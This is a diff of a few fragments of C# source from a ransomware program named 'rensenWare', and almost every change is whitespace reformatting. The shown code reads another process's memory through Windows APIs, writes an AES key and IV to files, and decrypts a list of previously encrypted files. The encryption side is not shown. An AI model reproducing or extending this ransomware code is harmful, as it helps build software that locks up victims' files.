@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
@@ -14,22 +14,22 @@ namespace rensenWare
 {
 	public partial class frmWarning : Form
 	{
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+		[DllImport("kernel32.dll")]
+		public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
-        [DllImport("kernel32.dll")]
-        private static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);
+		[DllImport("kernel32.dll")]
+		private static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);
 
-        private bool _flag;
-        private bool _flag_billion;
+		private bool _flag;
+		private bool _flag_billion;
 
-        private IntPtr _handle;
+		private IntPtr _handle;
 
 		public bool thProcessflag
 		{
 			get { return this._flag; }
 			
-            set
+			set
 			{
 				this._flag = value;
 				if (this._flag)
@@ -38,7 +38,7 @@ namespace rensenWare
 					{
 						this.ProcStatus.Text = "Detected";
 					}));
-                    return;
+					return;
 				}
 
 				this.ProcStatus.Invoke(new MethodInvoker(delegate()
@@ -74,7 +74,7 @@ namespace rensenWare
 
 						int num = 0;
 						
-                        byte[] _buffer = new byte[4];
+						byte[] _buffer = new byte[4];
 						if (!frmWarning.ReadProcessMemory((int)this._handle, 4910032, _buffer, 2, ref num))
 						{
 							this.thProcessflag = false;
@@ -121,11 +121,11 @@ namespace rensenWare
 					Thread.Sleep(100);
 				}
 
-                // Write the AES key and IV to their respective files
+				// Write the AES key and IV to their respective files
 				File.WriteAllBytes(Program.KeyFilePath, Program.randomKey);
 				File.WriteAllBytes(Program.IVFilePath,  Program.randomIV);
 				
-                this.decryptProgress.Maximum = Program.encryptedFiles.Count;
+				this.decryptProgress.Maximum = Program.encryptedFiles.Count;
 				using (List<string>.Enumerator enumerator = Program.encryptedFiles.GetEnumerator()) // Go through each of the encrypted files
 				{
 					while (enumerator.MoveNext())
@@ -140,8 +140,8 @@ namespace rensenWare
 
 							Program.Crypt(fileName, true); // Decrypt the file
 							
-                            ProgressBar progressBar = this.decryptProgress;
-                            progressBar.Value = progressBar.Value + 1;
+							ProgressBar progressBar = this.decryptProgress;
+							progressBar.Value = progressBar.Value + 1;
 							Thread.Sleep(100);
 						}
 						catch
